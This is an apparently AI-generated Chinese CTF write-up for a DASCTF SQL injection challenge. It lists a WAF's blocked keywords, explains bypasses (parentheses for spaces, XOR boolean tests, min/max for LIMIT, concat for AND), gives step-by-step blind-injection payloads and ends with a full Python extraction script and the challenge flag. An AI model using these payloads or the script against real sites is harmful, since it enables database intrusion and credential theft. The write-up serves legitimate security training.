---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'eb8ef57d-81fa-40bb-9d44-1945a4c21f12'
  PropagateID: 'eb8ef57d-81fa-40bb-9d44-1945a4c21f12'
  ReservedCode1: 'eaaf1826-9b80-4a43-86a3-0a2a71425991'
  ReservedCode2: 'eaaf1826-9b80-4a43-86a3-0a2a71425991'
---

## Syclover 极客大挑战 EasySQL 变体 — 布尔盲注绕过严格 WAF

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（布尔盲注 + WAF 绕过） |
| 难度 | 困难 |
| 日期 | 2026-08-11 |
| 来源 | DASCTF（Syclover 极客大挑战 EasySQL 变体） |
| Flag | `CTF2{82f9d96c-41c0-47b6-84f3-0dc653452d50}` |

### 题目描述

PHP + MySQL 应用，两个功能页面：
- **search.php**：GET 参数 `id`，提供 1-6 号按钮，返回不同提示文本
- **check.php**：GET/POST 参数 `username` + `password`，登录表单

页面文案暗示："大家好！我是练习时常两年半的，个人WEB程序员cl4y，我会php，PYTHON，mysql，SQL盲注"

### 信息收集

#### 页面结构

```
首页 → search.php (GET id=1~6) + check.php (POST username/password)

search.php 各 id 返回值：
id=1: "NO! Not this! Click others~~~"
id=2: "yingyingying~ Not this as well~~"
id=3: 大量重复 "Ohhh You find the flag read on!" + "I LIED TO YOU! NOT THIS!!! hahaha~"
id=4: "OK OK I will tell you,just in the next! really~~~~"
id=5: "You are too naive!How can I give it to you? So,why not take a look at the sixth one?But where is it?"
id=6: "Clever! But not this table."  ← 暗示要查表
id=0/-1/7+: "ERROR！！！"
```

#### check.php 分析

check.php 的 POST 方式**没有 WAF 过滤**（所有 SQL 关键词不拦截），但：
- 所有注入尝试均返回相同的 "Input your username and password" 页面
- 无论闭合方式（单引号/双引号/宽字节/反斜杠逃逸），响应无差异
- 无 SQL 错误回显、无时间差异（sleep 无延迟）
- 结论：check.php POST 可能存在 SQL 注入但无回显渠道，且登录逻辑使响应一致

### WAF 过滤规则（search.php GET 方式）

| 分类 | 被过滤 (BLOCKED) | 可用 (PASS) |
|------|---------|------|
| 逻辑运算 | `and`, `or`, `if`, `&&`, `\|\|`, `!` | `^`（异或）, `not`, `xor` |
| SQL 关键词 | `union`, `select `(+空格), `from `(+空格), `handler`, `drop`, `limit`, `having`, `like`, `rlike` | `select(`(+括号), `from(`(+括号), `where(`(+括号), `set`, `show`, `prepare`, `execute`, `order`, `group`, `join`, `between`, `in`, `regexp` |
| 特殊符号 | `*`, `+`, `\|`, `%` (hex), `0x` (hex) | `^`, `=`, `<`, `>`, `(`, `)`, `,`, `/`, `-`, `` ` ``, `;`, `--` |
| 注入函数 | `updatexml`, `extractvalue`, `sleep`, `benchmark` | `database()`, `substr()`, `ascii()`, `ord()`, `length()`, `concat()`, `group_concat()`, `left()`, `right()`, `min()`, `max()`, `count()` |

#### WAF 核心检测模式

```
"select " + 空格  → BLOCKED    "select(" → PASS (括号替代空格)
"from "   + 空格  → BLOCKED    "from("   → PASS
"where "  + 空格  → BLOCKED    "where("  → PASS
"*"                → BLOCKED    count(1)  → PASS (替代count(*))
"0x"               → BLOCKED    无法使用十六进制字符串
"union"            → BLOCKED    无法UNION注入
```

**关键绕过：`select(expr)from(table)where(cond)` — 用括号替代空格**

### 注入方法：布尔盲注

#### 原理

```
search.php 的 id 参数为数字型注入：
- id=1  → 返回 ROW_1 内容
- id=0  → ERROR
- id=1^0=1 → ROW_1 (true)
- id=1^1=0 → ERROR (false)

利用 XOR 构造布尔盲注：
0^(condition)
  condition=true  → 0^1=1 → 返回 id=1 的内容（"NO! Not this!"）
  condition=false → 0^0=0 → 返回 ERROR
```

#### 判断函数

```python
def is_true(payload):
    r = requests.get(BASE + '/search.php', params={'id': payload})
    return 'NO!' in r.text  # 返回 ROW_1 内容 = 条件为真
```

### 完整利用流程

#### Step 1: 数据库名

```sql
-- 布尔盲注逐字符提取
0^(ascii(substr(database(),1,1))=103)  → TRUE  → 'g'
0^(ascii(substr(database(),2,1))=101)  → TRUE  → 'e'
...
-- 结果: database() = "geek"
```

#### Step 2: 表名提取

```sql
-- 表数量
0^(0<(select(count(1))from(information_schema.tables)where(table_schema=database())))
-- 结果: 2 张表

-- 使用 min/max 提取表名（替代 limit，因 limit 被 WAF 拦截）
0^(ascii(substr((select(min(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70)
-- 结果: F1naI1y

0^(ascii(substr((select(max(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=70)
-- 结果: Flaaaaag
```

两个表：
- **F1naI1y** — 登录用户表
- **Flaaaaag** — 6 行提示信息（对应 search.php id=1~6）

#### Step 3: 列名提取

```sql
-- 使用 CONCAT 技巧绕过 AND 关键词过滤
-- "and" 被 WAF 拦截，无法直接写 WHERE table_name="F1naI1y" AND ordinal_position=N
-- 替代方案：concat(table_name,ordinal_position)="F1naI1yN"

0^(ascii(substr((select(column_name)from(information_schema.columns)
    where(concat(table_name,ordinal_position)="F1naI1y1")),{pos},1))={c})
-- 结果: id
0^(ascii(substr((select(column_name)from(information_schema.columns)
    where(concat(table_name,ordinal_position)="F1naI1y2")),{pos},1))={c})
-- 结果: username
0^(ascii(substr((select(column_name)from(information_schema.columns)
    where(concat(table_name,ordinal_position)="F1naI1y3")),{pos},1))={c})
-- 结果: password
```

F1naI1y 表三列：`id`, `username`, `password`

#### Step 4: 定位 Flag 数据

```sql
-- 用户名提取
id=1: mygod     id=2: welcome   id=3-6: site   id=7: Syc   id=8: finally   id=9: flag

-- id=9 的 username="flag"，password 长度=42，就是 flag
```

#### Step 5: 提取 Flag

```python
flag = ''
for pos in range(1, 43):
    for c in range(32, 127):
        payload = f'0^(ascii(substr((select(password)from(F1naI1y)where(id=9)),{pos},1))={c})'
        if is_true(payload):
            flag += chr(c)
            break
# 结果: CTF2{82f9d96c-41c0-47b6-84f3-0dc653452d50}
```

### 解题脚本

```python
import requests
import os
import time

os.environ['NO_PROXY'] = '*'
session = requests.Session()
session.trust_env = False

BASE = 'http://TARGET/http-ctf2.dasctf.com'

def is_true(payload):
    r = session.get(f'{BASE}/search.php', params={'id': payload}, timeout=10)
    return 'NO!' in r.text

def blind_extract(query, max_len=60):
    """布尔盲注逐字符提取"""
    result = ''
    for pos in range(1, max_len + 1):
        found = False
        for c in range(32, 127):
            payload = f'0^(ascii(substr(({query}),{pos},1))={c})'
            try:
                if is_true(payload):
                    result += chr(c)
                    found = True
                    break
            except:
                time.sleep(1)
        if not found:
            break
    return result

# 1. 数据库名
db = blind_extract("database()")
print(f"Database: {db}")

# 2. 表名（使用 min/max 避免 limit）
table1 = blind_extract(
    "select(min(table_name))from(information_schema.tables)"
    "where(table_schema=database())")
table2 = blind_extract(
    "select(max(table_name))from(information_schema.tables)"
    "where(table_schema=database())")
print(f"Tables: {table1}, {table2}")

# 3. 列名（使用 CONCAT 技巧替代 AND）
for ordinal in range(1, 4):
    col = blind_extract(
        f"select(column_name)from(information_schema.columns)"
        f"where(concat(table_name,ordinal_position)=\"F1naI1y{ordinal}\")")
    print(f"Column {ordinal}: {col}")

# 4. 提取 flag
flag = blind_extract("select(password)from(F1naI1y)where(id=9)", max_len=50)
print(f"FLAG: {flag}")
```

### 核心知识点

| 知识点 | 说明 |
|--------|------|
| `select(` 括号替代空格 | `select(expr)` 绕过 `select ` + 空格的 WAF 检测 |
| `from(` 括号替代空格 | `from(table)` 绕过 `from ` + 空格的 WAF 检测 |
| `where(` 括号替代空格 | `where(cond)` 绕过 `where ` + 空格的 WAF 检测 |
| `0^(condition)` 布尔盲注 | XOR 构造布尔条件，0^1=1（真）/ 0^0=0（假），结合数字型注入返回不同页面 |
| `count(1)` 替代 `count(*)` | `*` 被 WAF 拦截，`count(1)` 功能等价 |
| `min()/max()` 替代 `limit` | `limit` 关键词被 WAF 拦截，用 min/max + where 过滤逐行提取 |
| `concat(table_name,ordinal_position)` 替代 `AND` | `and` 关键词被 WAF 拦截，用 concat 拼接两字段做复合匹配 |
| `database()` 不被过滤 | WAF 不拦截内置函数名（database/version/user 等） |
| POST 无 WAF 但无回显 | check.php POST 方式无 WAF，但响应无差异，无法直接利用 |
| 布尔盲注 vs 报错注入 | 当 updatexml/extractvalue 被拦截时，布尔盲注是唯一手段（速度慢但可靠） |

### WAF 绕过技术对比

| 技术 | 本题 | 超难WAF题（第113题） | 说明 |
|------|------|---------|------|
| 空格绕过 | `select(` / `from(` / `where(` | `select(` / `from(` / `where(` | 同一思路：括号替代空格 |
| 逻辑运算 | `^` 异或 | `^` 异或 | 两题均可用 |
| 字符提取 | `ascii(substr())` | `ord(left/right())` | 本题 substr/ascii 未被拦截 |
| 报错注入 | 不可用（updatexml/extractvalue 被拦截） | 可用（updatexml/extractvalue 未拦截） | 本题 WAF 更严格 |
| AND 替代 | `concat` 拼接技巧 | `locate()` 匹配 | 不同策略 |
| limit 替代 | `min()/max()` | `group_concat()` | 两种思路均可 |
| `*` 过滤 | `count(1)` 替代 `count(*)` | 无此限制 | 本题额外限制 |
| `0x` 过滤 | 无法使用十六进制 | 可以使用 | 本题额外限制 |

### 同类变体与扩展

- 若 `ascii()/substr()` 也被拦截，可使用 `ord(left(right(),1))` 替代
- 若 `where()` 括号语法也被拦截，尝试 `having()` 或子查询派生表
- 若布尔盲注太慢，考虑时间盲注（`sleep()` 未被拦截时）或报错注入
- 若 `concat` 被拦截替代 `AND`，可尝试 `locate()` 做多重条件匹配
- 若 `min()/max()` 不足取中间行，可先取 min，再用 `where(col>min_val)` 取下一行
- 两表场景：Flaaaaag 存干扰信息，F1naI1y 存真正数据，需根据内容判断哪个表有价值

> AI生成